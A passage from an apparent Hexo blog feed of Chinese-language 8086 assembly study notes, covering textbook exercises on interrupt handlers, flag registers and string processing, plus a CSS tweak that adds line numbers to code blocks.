mov es,ax    ;找行号对应的内存地址    mov ah,00    mov al,160    mul dh    mov bp,ax    ;找列对应的内存地址    mov ah,00    mov al,2    mul dl    mov di,ax    s:        mov al,ds:[si]        cmp al,0        je ok        mov es:[bp+di],al        mov es:[bp+di+1],cl        inc si        add di,2        jmp s    ok:        iretinteruptend:    nopcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211023102716.png" alt="实现效果"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><blockquote><p>编写并安装int 7ch中断例程，功能为完成loop指令的功能<br>cx为循环次数，bx为位移</p></blockquote><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ul><li>编写能实现loop循环的中断处理程序</li><li>将终端服务程序移动到0000:0200处</li><li>修改中断向量表中的7cH号中断的入口地址,使其指向0000:0200</li></ul><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codedata segment    db 'welcome to masm!',0data endscode segmentstart:    mov ah,15    int 10h    mov ah,0    int 10h    mov ax,cs    mov ds,ax    mov si,offset interupt; set the ds:si point to the source address    mov ax,0    mov es,ax    mov di,200h; set the es:di point to the destination address    mov cx,offset interuptend-offset interupt; cx the length of transmisson    cld ; the sequence of the transmit    rep movsb    mov ax,0    mov es,ax    mov word ptr es:[7ch*4],200h    mov word ptr es:[7ch*4+2],0    mov ax,0b800h    mov es,ax    mov di,160*12    mov bx, offset s - offset se    mov cx,80s:    mov byte ptr es:[di],'!'    add di,2    int 7chse:     nop    mov ax,4c00h    int 21h;采用中断方式实现的loop,转移的范围要更大因为时16位的;正常情况下的loop是8位的,范围相对来说要小一些interupt:    push bp    mov bp,sp    dec cx    jcxz interuptret;就是加不加bx的区别,当cx为零的时候,这个时候就不加bx也就是不会再跳回去了    add ss:[bp+2],bx;注意这个bx是个负数！interuptret:    pop bp    iretinteruptend:    nopcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实现效果-1"><a href="#实现效果-1" class="headerlink" title="实现效果"></a>实现效果</h4><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211023102946.png" alt="实现效果"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><blockquote><p>下面的程序，分别在屏幕的第2、4、6、8行显示4句英文诗，补全程序.</p></blockquote><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><p>这里面有个写法挺奇妙的, <code>ds:[ds:[si]]</code>是可以这样嵌套着写的</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codecode segments1: db 'Good,better,best,','$'s2: db 'Never let it rest,','$'s3: db 'Till good is better,','$'s4: db 'And better,best.','$'s:  dw offset s1, offset s2, offset s3,offset s4row: db 2,4,6,8start:    mov ah,15    int 10h    mov ah,0    int 10h    mov ax,cs    mov ds,ax    mov bx,offset s    mov si,offset row;行号    mov cx,4ok:    mov bh,0;第0页    mov dh,ds:[si];这个行号怎么不起作用呢    mov dl,0;列号    mov ah,2    int 10    mov dx,ds:[ds:[bx]];可以这样嵌套着写！我真是个大聪明！哈哈哈哈哈~~~    mov ah,9    int 21h        ;直接在这里加就行了,不用非得跑到mov指令那里加    ;不能直接加 标号,得加寄存器,你个憨憨    add si,1    add bx,2    loop ok    mov ax,4c00h    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>有个疑惑就是为什么这个地方的行号和列号的改变不起作用呢??</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211023103301.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-内中断</title>
      <link href="/2021/10/21/hui-bian-yu-yan-xue-xi-nei-zhong-duan/"/>
      <url>/2021/10/21/hui-bian-yu-yan-xue-xi-nei-zhong-duan/</url>
      
        <content type="html"><![CDATA[<h1 id="内中断"><a href="#内中断" class="headerlink" title="内中断"></a>内中断</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211021105626.png" alt="思维导图"></p><h2 id="debug单步执行命令的原理"><a href="#debug单步执行命令的原理" class="headerlink" title="debug单步执行命令的原理"></a>debug单步执行命令的原理</h2><p>基本上,CPU在执行完一条指令之后,如果检测到标志寄存器的TF位为1,则产生单步中断,引发中断的过程。单步中断的中断类型码为1,则它引发的中断过程如下:</p><ul><li>取得中断码类型1</li><li>标志寄存器入栈,TF\IF设置为0</li><li>CS、IP入栈</li><li>IP=(1<em>4),CS=(1</em>4+2)</li></ul><p>首先Debug提供了单步中断的中断处理程序,功能为显示所有寄存器中的内容后等待输入命令。然后,在使用t命令执行执行时,Debug将TF设置为1,使得CPU工作于中断方式下,则在CPU执行完这条指令后就引发单步中断,执行单步中断的中断处理程序,所有寄存器中的内容将被显示在屏幕上，并且等待输入命令。</p><p>在进入中断处理程序之前,设置TF=0。从而避免CPU在执行中断处理程序的时候发生单步中断。这就是为什么在终端过程中有TF=0这一步。</p><p>最后,CPU提供单步中断功能的原因就是，为单步跟踪程序的执行过程，提供实现机制</p><h2 id="响应中断的特殊情况"><a href="#响应中断的特殊情况" class="headerlink" title="响应中断的特殊情况"></a>响应中断的特殊情况</h2><p>一般情况下,CPU在执行完当前指令后，如果检测到中断信息，就响应中断，引发中断过程。可是，在有些情况下，CPU在执行完当前指令后，即便是发生中断，也不会相响应。对于这些情况，下面列举其中一种情况来进行说明。</p><p>在执行完向ss寄存器传送数据的指令后，即便是发生中断，CPU也不会相应。这样做的主要原因是，SS:SP联合指向栈顶，而对它们的设置应该连续完成。如果在设置完ss的指令后，CPU响应中断，引发中断过程，要在栈中压入标志寄存器，cs和ip的值。而ss改变，sp并未改变，ss：sp指向的不是正确的栈顶，将引起出错误。所以CPU在执行完设置ss 的指令后，不响应中断。</p><p>所以我们应该利用这个特性，将设置ss和sp的指令连续存放。</p><h2 id="实验12"><a href="#实验12" class="headerlink" title="实验12"></a>实验12</h2><blockquote><p>编写0号中断的处理程序,使得在除法溢出发生时,在屏幕中间显示字符串”divide error!”,然后返回到DOS</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>编写能显示divide error！的0号中断处理程序</li><li>将终端服务程序移动到0000:0200处</li><li>修改中断向量表中的0号中断的入口地址,使其指向0000:0200</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><blockquote><p>一些注意事项和问题就写到注释里面了,后面忘了的话记得看看</p></blockquote><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codecode segmentstart:;清屏    mov ah,15    int 10h    mov ah,0    int 10h;将do0送入内存0000:0200处    ;ds:si传送的原始位置    mov ax,code    mov ds,ax    mov si,offset do0    ;es:di传送的目的位置    mov ax,0000    mov es,ax    mov di,0200h;！！！！0200后面要加h啊！！     ;传送的长度    mov cx,offset do0end - offset do0    ;传送的方向 正向传送    cld    rep movsb;将do0的入口地址0000:0200存储在中断向量表0号表项中    mov ax,0000    mov es,ax    mov word ptr es:[0],0200h ;！！！！在没有寄存器显示指示操作的数据大小的时候,一定要用word或者byte显式指明    mov word ptr es:[2],0000h ;另外你只用写往里面存的数就行了,不用按照高低字节改变,他自己会改变的    mov ax,1000    mov bh,1    div bh    mov ax,4c00h    int 21;可以显示 overflow的中断处理程序 do0do0:    jmp do0start    db 'divide error!'do0start:    mov ax,cs    mov ds,ax    mov si,0202h ;设置ds:si指向字符串        mov ax,0B800H    mov es,ax    mov di,12*160+36*2 ;设置es:di指向字符串        ;明白为什么这里它不用这个rep的命令了把,因为显存里面的结构是 要显示的字符+颜色背景啥的,但是这个只能是一个一个的加    mov cx,13;设置字符串长度    ; cld;设置传输方向    ; rep movsb    s:        mov al,[si]        mov es:[di],al        inc si        add di,2;为什么不用rep命令的原因就在这        loop s    mov ax,4c00h    int 21hdo0end:    nopcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-标志寄存器</title>
      <link href="/2021/10/20/hui-bian-yu-yan-xue-xi-biao-zhi-ji-cun-qi/"/>
      <url>/2021/10/20/hui-bian-yu-yan-xue-xi-biao-zhi-ji-cun-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211020165355.png" alt="思维导图"></p><h2 id="计算机是如何知道到底是按有符号数处理还是按无符号数处理"><a href="#计算机是如何知道到底是按有符号数处理还是按无符号数处理" class="headerlink" title="计算机是如何知道到底是按有符号数处理还是按无符号数处理"></a>计算机是如何知道到底是按有符号数处理还是按无符号数处理</h2><p>CPU在执行add等指令的时候,就包含了两种含义:无符号数运算和有符号数运算。对于无符号数运算,CPU用CF位来记录是否产生了进位;对于有符号数运算,CPU用OF位来记录是否产生了溢出,当然,还要用SF位记录结果的符号。CF和OF所表示的进位和溢出,是分别对无符号数和有符号数运算而言的,他们之间没有任何关系。</p><p>也就是说,本身就是有两层含义都在,但具体看作哪一种,取决于写程序的你怎么处理这些变换的标志位。如何利用这些标志位和运算结果来正确的表达你想要的计算方式。</p><h2 id="实验11"><a href="#实验11" class="headerlink" title="实验11"></a>实验11</h2><blockquote><p>编写一个子程序,将包含任意字符,以0结尾的字符串中的小写字母转变成大写字母,描述如下。<br>名称：letterc<br>功能：将以0为结尾的字符串中的小写字母转变成大写字母<br>参数：ds:si指向字符串首地址</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>判断所取到的字节数据是不是0,是的话结束,不是的话,继续判断</li><li>判断取到的字节数据是不是小写字母。是的话,转变成大写字母；不是的话,就不变</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codesgdatasg segment    db "Beginner's All-purpose Symbolic Instruction Code.",0datasg endscodesg segment    begin:        mov ax,datasg        mov ds,ax        mov si,0        call letterc        mov ax,4c00h        int 21hletterc:    mov ch,00    mov cl,ds:[si]    jcxz ok    cmp cx,97    jb next    cmp cx,122    ja next    sub cx,32    mov ds:[si],clnext:    inc si    jmp lettercok:     retcodesg endsend begin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决主题代码块没有行号的问题</title>
      <link href="/2021/10/19/jie-jue-zhu-ti-dai-ma-kuai-mei-you-xing-hao-de-wen-ti/"/>
      <url>/2021/10/19/jie-jue-zhu-ti-dai-ma-kuai-mei-you-xing-hao-de-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="解决主题代码块没有行号的问题"><a href="#解决主题代码块没有行号的问题" class="headerlink" title="解决主题代码块没有行号的问题"></a>解决主题代码块没有行号的问题</h1><p>也是看了网上许多的解决方案,因为自己并不是很清楚这个hexo渲染页面详细的原理,所以对于一些基本的解决方案并没有自己的思考。通过观察别人的博客,通过控制台看其他人的css、js文件,终于发现可能是主题本身就没有写这部分,所以即使设置改回来了,还是没有办法实现。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="1-在主题下的source-css-matery-css下添加如下代码"><a href="#1-在主题下的source-css-matery-css下添加如下代码" class="headerlink" title="1.在主题下的source/css/matery.css下添加如下代码"></a>1.在主题下的source/css/matery.css下添加如下代码</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211019164659.png" alt="具体目录"></p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.line-numbers-rows</span> <span class="token punctuation">&#123;</span>    <span class="token property">border-right-width</span><span class="token punctuation">:</span> 0px <span class="token important">!important</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.line-numbers</span> <span class="token punctuation">&#123;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 1.5rem 1.5rem 1.5rem 3.5rem <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> 1rem 0 <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> #272822<span class="token punctuation">;</span>    <span class="token property">overflow</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 0.35rem<span class="token punctuation">;</span>    <span class="token property">tab-size</span><span class="token punctuation">:</span> 4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-在主题下的source-libs-prism-prism-css中添加如下代码"><a href="#2-在主题下的source-libs-prism-prism-css中添加如下代码" class="headerlink" title="2.在主题下的source/libs/prism/prism.css中添加如下代码"></a>2.在主题下的source/libs/prism/prism.css中添加如下代码</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">pre[class*="language-"].line-numbers</span> <span class="token punctuation">&#123;</span> <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span> <span class="token property">padding-left</span><span class="token punctuation">:</span> 3.8em<span class="token punctuation">;</span> <span class="token property">counter-reset</span><span class="token punctuation">:</span> linenumber<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">pre[class*="language-"].line-numbers > code</span> <span class="token punctuation">&#123;</span> <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span> <span class="token property">white-space</span><span class="token punctuation">:</span> inherit<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.line-numbers .line-numbers-rows</span> <span class="token punctuation">&#123;</span> <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token property">top</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">left</span><span class="token punctuation">:</span> -3.8em<span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> 3em<span class="token punctuation">;</span> <span class="token comment">/* works for line-numbers below 1000 lines */</span> <span class="token property">letter-spacing</span><span class="token punctuation">:</span> -1px<span class="token punctuation">;</span> <span class="token property">border-right</span><span class="token punctuation">:</span> 1px solid #999<span class="token punctuation">;</span> <span class="token property">-webkit-user-select</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token property">-moz-user-select</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token property">-ms-user-select</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span> <span class="token property">user-select</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token selector">.line-numbers-rows > span</span> <span class="token punctuation">&#123;</span>  <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">counter-increment</span><span class="token punctuation">:</span> linenumber<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>  <span class="token selector">.line-numbers-rows > span:before</span> <span class="token punctuation">&#123;</span>   <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">counter</span><span class="token punctuation">(</span>linenumber<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token property">color</span><span class="token punctuation">:</span> #999<span class="token punctuation">;</span>   <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>   <span class="token property">padding-right</span><span class="token punctuation">:</span> 0.8em<span class="token punctuation">;</span>   <span class="token property">text-align</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> hexo主题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码块行数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-课程设计</title>
      <link href="/2021/10/18/hui-bian-yu-yan-xue-xi-ke-cheng-she-ji/"/>
      <url>/2021/10/18/hui-bian-yu-yan-xue-xi-ke-cheng-she-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="课程设计"><a href="#课程设计" class="headerlink" title="课程设计"></a>课程设计</h1><p>在整个课程中,我们一共有两个课程设计,编写两个比较综合的程序,这是第一个。任务:将实验7中的power idea公司的数据按照图10.2所示的格式在屏幕上显示出来。</p><p><strong>效果</strong><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211018160247.png" alt="20211018160247"></p><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ul><li>从数字转换成字符串–通过除以10来不断获取余数,在加上30,最后再逆向输出</li><li>因为程序要显示的数据有些已经大于65535,应该编写一个新的数据到字符串转换的子程序,完成dword型到字符串的转换</li><li>在循环中如何选择寄存器(组合)来实现对有规律数据的复制</li><li>对数据存储结构和控制移位的寄存器值的变化的控制</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然实现了效果,但是在思路上还是比较凌乱,尤其是在整体的思路上面.还是改不了边写边改的毛病.</p><ul><li><input disabled="" type="checkbox"> 后面还是要不断的把代码再优化优化</li></ul><h2 id="整理"><a href="#整理" class="headerlink" title="整理"></a>整理</h2><h3 id="寄存器寻址组合"><a href="#寄存器寻址组合" class="headerlink" title="寄存器寻址组合"></a>寄存器寻址组合</h3><p>已知的是 di+bp / bx+si / bx+di 这几种可以用来在内存中遍历数据,在用之前,需要搞清楚,数据元素的确定最少需要几个变化的值来定位。</p><h3 id="条件指令的转移范围"><a href="#条件指令的转移范围" class="headerlink" title="条件指令的转移范围"></a>条件指令的转移范围</h3><p>条件指令的转移范围只能是从(-128-127),如果想要跳转的位置超过了这个范围,可以先跳到附近的位置,再在附近的位置利用无条件指令跳到想跳到的位置。</p><h3 id="汇编语言清除屏幕输出"><a href="#汇编语言清除屏幕输出" class="headerlink" title="汇编语言清除屏幕输出"></a>汇编语言清除屏幕输出</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">mov ah,15int 10hmov ah,0int 10h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul><li>哪些寄存器在循环的过程中需要变化,哪些寄存器需要在下一次循环或者调用子程序之前初始化,这些都要搞清楚</li><li>再利用div等有范围和大小限制的指令时,考虑一下是否会有溢出的情况</li><li>jmp和je等条件跳转指令如何实现循环的过程</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">;TODO ;1.现在 char段前面四个字节的年份复制完成了 √;2.着手将收入转换位为字符串并存在char段中  √;3.下一步是 将雇员数转换为字符串存在char段中,这个应该不用divdw了 √;4.最后一步就是显示了,不过应该也是比较头疼的把 √;整理TODO;1.整理一下到底哪几个寄存器可以组合起来用来寻址,我快疯了~~~;已知的是di+bp/bx+si/bx+diassume cs:codesg,ds:datadata segment    ;0    db '1975','1976','1977','1978','1979','1980','1981','1982','1983'    db '1984','1985','1986','1987','1988','1989','1990','1991','1992'    db '1993','1994','1995'    ;54H    dd 16,22,382,1356,2390,8000,160000,24486,50065,97479,140417,197514    dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000        ;A8H    dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226    dw 11542,14430,15257,17800data endstable segment    db 21 dup ('year summ ne ?? ')table endschar segment    db 672 dup(0) ;672 = 32*21 每一年的数据占23个字节(取个整数刚好是32个字节-16的倍数), 一共有21年    ;00 XXXX    ;03 XXXX    ;06 XXXX    ;09 XXXX    ;年份 1997          4字节    ;空格               1字节-5    ;收入 max = 5937000 7个字节    ;空格               1字节-13        ;雇员数 max = 17800 5个字节    ;空格               1字节-19    ;人均收入 max = 333  3个字节    ;空格               1字节char endstestsg segment    db 1680 dup(0) testsg segmentcodesg segmentstart:    mov ah,15    int 10h    mov ah,0    int 10h    mov ax,data    mov ds,ax    mov ax,table    mov es,ax    call calculate_income    mov ax,table    mov ds,ax    mov ax,char    mov es,ax    call duplicate_year        call num_char    call employees_char    call average_salary_char    call show_str        mov ax,4c00h    int 21h;将数据存入显存当中show_str:    mov ax,char    mov ds,ax    mov ax,0B800H    mov es,ax        mov dh,4;行号    mov dl,0;列号    mov cl,2;颜色    mov bx,0    show_str_year:        push dx        ;找行号对应的内存地址        mov ah,00        mov al,160        mul dh        mov bp,ax        ;找列对应的内存地址        mov ah,00        mov al,2        mul dl        mov di,ax                ; ;找行号对应的内存地址--数据段        ; mov ah,00        ; mov al,10H        ; mov dl,dh        ; mov dh,0        ; mul dx        ; mov bx,ax        ;把颜色转移一下        mov al,cl        push cx        mov si,0        show_str_year_loop:            mov cl,ds:[bx+si]            mov ch,0            jcxz show_str_year_loop_ok            mov es:[bp+di],cl            mov es:[bp+di+1],al            add di,2            add si,1            jmp short  show_str_year_loop        show_str_year_loop_ok:            pop cx            mov dl,10;列号            ;更新下一个列地址            mov ah,00            mov al,2            mul dl            mov di,ax            ;把颜色再设置回来            mov al,cl                push cx        mov si,0        show_str_income_loop:            mov cl,ds:[bx+si+5]            mov ch,0            jcxz show_str_income_loop_ok            mov es:[bp+di],cl            mov es:[bp+di+1],al            add di,2            add si,1            jmp short  show_str_income_loop        show_str_income_loop_ok:            pop cx            mov dl,20;列号            ;更新下一个列地址            mov ah,00            mov al,2            mul dl            mov di,ax            ;把颜色再设置回来            mov al,cl                push cx        mov si,0        show_str_employees_loop:            mov cl,ds:[bx+si+13]            mov ch,0            jcxz show_str_employees_loop_ok            mov es:[bp+di],cl            mov es:[bp+di+1],al            add di,2            add si,1            jmp short  show_str_employees_loop        show_str_employees_loop_ok:            pop cx            mov dl,30;列号            ;更新下一个列地址            mov ah,00            mov al,2            mul dl            mov di,ax            ;把颜色再设置回来            mov al,cl        push cx        mov si,0        show_str_average_loop:            mov cl,ds:[bx+si+19]            mov ch,0            jcxz show_str_average_loop_ok            mov es:[bp+di],cl            mov es:[bp+di+1],al            add di,2            add si,1            jmp short  show_str_average_loop        show_str_average_loop_ok:            pop cx            mov dl,40;列号            ;更新下一个列地址            mov ah,00            mov al,2            mul dl            mov di,ax            ;把颜色再设置回来            mov al,cl                       pop dx        add bx,20H        add dh,1;行号加一        mov dl,0;列号清零        mov ax,21        sub al,dh        cmp byte ptr al,0        ; cmp byte ptr dh,21        ;je show_str_ok;这很明显不相等啊,为什么还跳转了？        ;你应该是跳转到循环里才对,如果不是跳到循环里,它其实没有发生跳转,只是按顺序往下执行刚好到下面了        je show_str_ok;这样写也跳转了。。？？        show_str_year_relay:            jmp show_str_year    show_str_ok:        ret;把人均工资部分转换成字符串average_salary_char:    mov bx,0    mov di,0    mov cx,21    average_salary_char_all:        push cx        mov ax,ds:[bx+0DH]        mov dx,0        mov si,0        mov bp,10        average_salary_char_one:                div bp            cmp ax,0            je average_salary_char_one_ok            push dx            mov dx,0            inc si            jmp average_salary_char_one        average_salary_char_one_ok:            push dx            inc si                        mov cx,si            mov si,0            mov bp,0            average_salary_char_one_ok_loop:                pop ax                add al,30H                mov es:[di+bp+19],al                inc bp                loop average_salary_char_one_ok_loop        pop cx        add bx,10H        add di,20H        loop average_salary_char_all    ret;把雇员数部分转换成字符串employees_char:    mov bx,0    mov di,0    mov cx,21    employees_char_all:        push cx        mov ax,ds:[bx+0AH]        mov dx,0        mov si,0        mov bp,10        employees_char_one:                div bp            cmp ax,0            je employees_char_one_ok            push dx            mov dx,0            inc si            jmp employees_char_one        employees_char_one_ok:            push dx            inc si                        mov cx,si            mov si,0            mov bp,0            employees_char_one_ok_loop:                pop ax                add al,30H                mov es:[di+bp+13],al                inc bp                loop employees_char_one_ok_loop        pop cx        add bx,10H        add di,20H        loop employees_char_all    ret;把收入部分的数字转换为字符串存储到内存当中num_char:    mov bx,0    mov cx,21    num_char_loop:        push cx                mov si,0        mov di,0        mov ax,ds:[bx+5H]        mov dx,ds:[bx+7H]        mov cx,0AH        ;具体的一个数转换为字符        num_char_loop_div:            call divdw            mov bp,0            ;如果dx和ax都为零说明该数转换完成            mov bp,dx            or bp,ax            cmp bp,0            je num_char_loop_div_ok            push cx;余数入栈            inc si            mov cx,0AH;每次跳回去之前要把cx再设置为零            jmp num_char_loop_div            num_char_loop_div_ok:                ;最后一个商小于10,上面没办法入栈了                push cx;在这里把这个入栈                inc si                mov cx,si;si中保留着这个具体数的所有余数                mov bp,0                mov ax,2H                mul bx                 mov di,ax                 num_char_loop_div_ok_loop:                        pop ax                    add ax,30H                    mov es:[di+5H+bp],al                    add bp,1                    loop num_char_loop_div_ok_loop                ; ;填了个空格                ; mov al,' '                ; mov es:[di+5H+bp],al        pop cx        add bx,10H        loop num_char_loop;把data段中的年份复制到char段里面去duplicate_year:    mov bx,0    mov si,0    mov di,0    mov cx,21    duplicate_year_all:        push cx        mov cx,2        mov bx,0        duplicate_year_year:            mov ax,ds:[di+bx]            mov es:[si+bx],ax            add bx,2            loop duplicate_year_year        ; ;添个空格         ; mov al,' '        ; mov es:[si+bx],al        add si,20H        add di,10H        pop cx        loop duplicate_year_all    ret;刚好是之前计算人均收入程序calculate_income:    mov bx,0;bx定位data段,bx year和收入都是四个字节可以公用,但是雇员数是两个字节的没办法公用    mov bp,0;bp定位es段    mov di,0;di用来在循环中服务于雇员数,因为它是两个字节,没办法跟year和outcome公用一个递增寄存器    mov cx,21    overall:        push cx        mov cx,2        mov si,0        year:            ;年份的4字节---两个字            mov ax,ds:[bx+si]            mov es:[bp+si],ax            add si,2            loop year        mov cx,2        mov si,0        outcome:            ;收入的4字节---两个字            mov ax,ds:[bx+54H+si]            mov es:[bp+5H+si],ax            add si,2            loop outcome        ;雇员数---一个字        mov ax,ds:[di+0A8H]        mov es:[bp+0AH],ax        ;计算人均收入        mov ax,es:[bp+5H];计算人均收入的,要用es的定位,那偏移量就得按照es的来。最开始写成ds的定位了[bx+54H]了        mov dx,es:[bp+5H+2]        div word ptr es:[bp+0AH]        mov es:[bp+0DH],ax     